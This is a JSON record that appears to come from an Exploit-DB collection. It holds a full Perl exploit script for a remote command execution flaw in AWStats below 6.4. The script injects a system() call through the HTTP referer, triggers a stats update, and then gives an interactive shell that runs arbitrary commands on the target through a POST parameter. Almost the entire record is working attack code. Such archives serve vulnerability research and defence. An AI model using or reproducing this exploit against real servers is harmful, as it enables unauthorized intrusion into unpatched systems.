{
  "id": "1508",
  "title": "AWStats &lt; 6.4 - &#039;referer&#039; Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n## AWStats < 6.4 command execution exploit\r\n## based on http://www.idefense.com/application/poi/display?id=290&type=vulnerabilities\r\n## (c)oded by 1dt.w0lf\r\n## 11.08.2005\r\n## RST/GHC\r\n## http://rst.void.ru\r\n## http://ghc.ru\r\n\r\n## Note\r\n## Exploitation will not occur until the stats page has been regenerated\r\n## with the tainted referrer values from the http access log.\r\n## AWStats is only vulnerable in situations where at least one URLPlugin is enabled.\r\n\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Headers;\r\n\r\nif(@ARGV<1) { &usage; exit(0); }\r\n\r\n$path = $ARGV[0];\r\nheader();\r\nprint \"Creating shell... Please wait\\n\";\r\n\r\n $aw = LWP::UserAgent->new() or die;\r\n $req = HTTP::Request->new(GET => $path);\r\n $req->referer(qq[http://'.system(\\$FilterEx{\\'refererpages\\'}).']);\r\n $res = $aw->request($req); \r\n \r\n $aw = LWP::UserAgent->new() or die;\r\n $res = $aw->get($path.'?output=refererpages&update=1');\r\n\r\nwhile ()\r\n {\r\n    print \"Type command for execute or 'q' for exit # \";\r\n    while(<STDIN>)\r\n     {\r\n        $cmd=$_;\r\n        chomp($cmd);\r\n        exit() if ($cmd eq 'q');\r\n        last;\r\n     }\r\n    &run($cmd);\r\n }\r\n\r\nsub run()\r\n {\r\n $cmd2  = 'echo 1 && echo _START_ && ';\r\n $cmd2 .= $cmd;\r\n $cmd2 .= ' && echo _END_';\r\n $aw = LWP::UserAgent->new() or die;\r\n $res = $aw->post(\r\n                  \"$path\",\r\n                  {\r\n                   \"output\" => \"refererpages\",\r\n                   \"refererpagesfilterex\" => \"$cmd2\"\r\n                  }\r\n                 );\r\n @result = split(/\\n/,$res->content);\r\n $runned = 0;\r\n $on = 0;\r\n print \"\\n\";\r\n for $res(@result)\r\n  {\r\n    if ($res =~ /^_END_/) { print \"\\n\"; return 0; }\r\n    if ($on == 1) { print \"  $res\\n\"; }\r\n    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } \r\n  }\r\n print \"Can't execute command\\n\" if !$runned;\r\n }\r\n\r\nsub header()\r\n{\r\n print \"--* AWStats < 6.4 exploit by RST/GHC\\n\";\r\n print \"--* keep it private, not for public\\n\";\r\n}\r\n\r\nsub usage()\r\n {\r\n  header();\r\n  print \"usage : r57awstats.pl [path_to_awstats.pl]\\n\";\r\n  print \"  e.g.: r57awstats.pl http://127.0.0.1/cgi-bin/awstats.pl\\n\";\r\n }\r\n\r\n# milw0rm.com [2006-02-17]",
  "url": "https://www.exploit-db.com/exploits/1508"
}